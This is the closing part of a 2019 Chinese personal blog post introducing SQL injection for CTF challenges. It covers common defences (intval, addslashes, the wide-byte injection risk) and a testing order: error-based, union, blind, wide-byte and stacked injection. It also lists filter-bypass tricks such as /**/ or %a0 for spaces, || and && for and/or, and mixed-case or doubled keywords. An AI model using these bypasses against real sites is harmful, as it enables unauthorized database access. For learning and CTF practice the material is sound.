<h2 id="常见的一些思路"><a href="#常见的一些思路" class="headerlink" title="常见的一些思路"></a>常见的一些思路</h2><h3 id="常见的一些保护手段"><a href="#常见的一些保护手段" class="headerlink" title="常见的一些保护手段"></a>常见的一些保护手段</h3><p>  对于数字型参数的保护是用intval()函数转为数字，对于字符型参数的保护主要使用addslash()函数，但这种保护需要注意mysql的连接的编码和网页的编码需要保持一致，不然可能产生宽字节注入的危险。碰到waf的时候根据情况处理即可，碰到常规注入都行不通的情况考虑堆叠注入。</p>
<h3 id="测试的思路"><a href="#测试的思路" class="headerlink" title="测试的思路"></a>测试的思路</h3><p>  首先上来拿到题目最好先拿源码泄露脚本扫描一遍，看看能不能拿到源码。右键看下源码，能看的东西都看一遍。然后寻找可控制的参数，做一下fuzz。首先考虑闭合语句，再优先考虑报错注入和联合注入，都不可行的情况下考虑盲注，最后可以尝试宽字节注入和堆叠注入。主要常见的闭合语句就是‘和‘），’))几种，都试一试。语句正确的情况下考虑and和or被过滤的情况，建议替换为||和&amp;&amp;。对于空格的过滤可以考虑替换为/**/和%a0。如果存在关键词的黑名单，考虑随机大小写关键词和双写绕过，也可以考虑一些特殊的符号比如1e0，Emoj等等来截断。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这是本人的第一篇博客，写的比较水，后续打算写几篇最近做题的wp或者更具体的一些分析，比如报错注入的一些点就可以好好讲讲。近期还是优先准备4，6级考试。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/06/05/sql注入初步/" data-id="ck2jra66h0003fbtlvhrc9bqy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>

    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/500lines/">500lines</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe注入/">xxe注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/500lines/" style="font-size: 10px;">500lines</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe注入/" style="font-size: 10px;">xxe注入</a> <a href="/tags/信息收集/" style="font-size: 10px;">信息收集</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/11/03/近期比赛的wp/">近期比赛的wp</a>
          </li>
        
          <li>
            <a href="/2019/09/21/xss练习小结/">xss练习小结</a>
          </li>
        
          <li>
            <a href="/2019/09/11/Minuv2靶机渗透实战/">Minuv2靶机渗透实战</a>
          </li>
        
          <li>
            <a href="/2019/09/02/shell编程基础/">shell编程基础</a>
          </li>
        
          <li>
            <a href="/2019/08/20/简易python模板引擎其一/">简易python模板引擎其一</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 star<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>